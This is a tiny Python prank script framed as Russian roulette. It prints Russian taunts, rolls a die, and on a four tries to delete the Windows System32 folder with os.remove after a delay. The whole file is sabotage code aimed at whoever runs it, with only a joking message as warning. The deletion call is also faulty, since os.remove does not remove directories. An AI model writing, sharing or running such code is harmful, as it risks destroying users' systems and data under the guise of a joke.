import random
import os
from time import*
print('Заряжаю револьвер...')
sleep(1)

random_number = random.randint(1, 6)
if random_number==4:
    print('ПОМЯНЕМ АХАХАХАХАХАХ')
else:
    print('Живи пока, тут ', random_number)

sleep(5)

file_path = "C:/Windows/System32"
if random_number==4:
    sleep(10)
    os.remove(file_path)
